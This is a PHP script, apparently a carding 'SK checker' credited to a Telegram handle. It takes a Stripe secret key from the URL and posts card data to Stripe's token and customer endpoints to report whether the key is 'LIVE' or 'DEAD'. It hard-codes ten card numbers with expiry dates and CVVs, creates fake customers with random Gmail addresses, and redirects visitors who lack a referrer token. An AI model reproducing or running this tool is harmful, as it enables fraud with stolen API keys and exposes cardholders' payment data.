<?php
//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include './config.php';
if ($_GET['referrer'] != "Tikol4Life") { 
    $i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
    exit();
}

/*===[Variable Setup]=========================================*/
$sk = $_GET['sk'];

/*===[SK Info Validation]=====================================*/
if($sk == ""){
    exit();
}

/*===[CC Info Randomizer]=====================================*/
$cc_info_arr[] = "4427323412042742|11|2022|778";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "4427325078084744|11|2023|720";
$cc_info_arr[] = "4427323412486766|08|2024|555";
$cc_info_arr[] = "4427323412172176|08|2022|776";
$cc_info_arr[] = "4867320147781682|05|2022|237";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4427323412367842|01|2025|124";
$cc_info_arr[] = "4427325012730451|04|2025|227";
$cc_info_arr[] = "4427325662058237|09|2023|708";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[cURL Processes]=========================================*/
/* 1st cURL */
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
curl_close($ch1);

/* 1st cURL Response */
$res1 = json_decode($curl1, true);

if(isset($res1['id'])){
    /* 2nd cURL */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=$email&description=Tikol4Life&source=".$res1["id"]);
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    curl_close($ch2);

    /* 2nd cURL Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
}

/*===[cURL Response Setup]====================================*/
if(isset($res1['error'])){
    if (isset($res1['error']['type'])&&$res1['error']['type'] == 'invalid_request_error') {
        echo "DEAD";
    }else{
        echo "LIVE";
    }
}else{
    if(isset($res2['error'])){
        if (isset($res2['error']['type'])&&$res2['error']['type'] == "invalid_request_error") {
            echo "DEAD";
        }else{
            echo "LIVE";
        }
    }else{
        echo "LIVE";
    }
}




/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
?>
